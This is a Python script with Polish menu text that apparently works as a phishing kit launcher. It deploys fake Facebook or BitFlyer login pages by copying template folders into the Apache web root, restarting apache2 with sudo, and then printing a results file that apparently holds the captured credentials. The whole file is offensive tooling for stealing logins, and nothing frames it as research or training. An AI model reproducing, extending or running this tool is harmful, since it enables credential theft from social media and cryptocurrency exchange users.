import os
import shutil

sites_options = {
    1: 'Facebook',
    2: 'BitFlyer',
    0: 'Exit',
}

phishing_options = {
    1: 'Tworzenie phishingowej strony',
    2: 'Sprawdzanie wyników',
    0: 'Wyjdź',
}

def print_sites(menu):
    for key in menu.keys():
        print (key, '--', menu[key] )

def copy_files(strona):
    src = 'html/{}'.format(strona)
    dest = '/var/www/html/'
    src_files = os.listdir(src)
    for file_name in src_files:
        full_file_name = os.path.join(src, file_name)
        if os.path.isfile(full_file_name):
            shutil.copy(full_file_name, dest)
    os.system("sudo service apache2 stop")
    os.system("sudo service apache2 start")
    print("""######################################################
### Strona utworzona! Przejdź do http://localhost/ ###
######################################################
""")

def create_page():
    print_sites(sites_options)
    strona = ''
    try:
        strona = int(input("Wybierz wzór strony do utworzenia: "))
    except:
        print('Zły wybór. Wprowadź liczbę...')
    if strona == 1:
        print("Przygotowywanie strony logowania Facebook...")
        copy_files('fb')
    elif strona == 2:
        print("Przygotowywanie strony logowania BitFlye...")
        copy_files('bitf')
    else:
        print('Zły wybór. Wybierz liczbę od 1 do 2...')

def show_results():
    print("Wyniki: ")
    os.system("cat /var/www/html/results.txt")

def phishing_site():
    while True:
        print_sites(phishing_options)
        menu = ''
        try:
            menu = int(input("Wybierz opcję: "))
        except:
            print('Zły wybór. Wprowadź liczbę...')
        if menu == 1:
            create_page()
        elif menu == 2:
            show_results()
        elif menu == 0:
            print("Bye")
            break
        else:
            print('Zły wybór. Wybierz liczbę od 1 do 2...')
